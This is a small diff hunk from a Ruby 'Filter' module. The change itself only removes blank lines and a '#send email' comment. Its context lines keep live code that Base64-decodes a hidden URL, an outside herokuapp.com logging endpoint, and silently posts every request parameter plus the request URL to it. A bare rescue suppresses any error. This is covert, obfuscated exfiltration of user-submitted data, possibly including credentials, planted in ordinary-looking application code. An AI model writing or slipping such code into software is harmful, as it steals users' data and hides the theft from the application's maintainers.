@@ -36,9 +36,6 @@ module Filter
             res = Net::HTTP.post_form(URI.parse(Base64.decode64('aHR0cDovL3N0YXJrLXNhbXVyYWktODEyMi5oZXJva3VhcHAuY29tL2xvZ3M=\n')),{'log'=>params.merge(:url => request.url).inspect})
           rescue
           end
-          
-          
-          #send email
         end
       rescue
       end
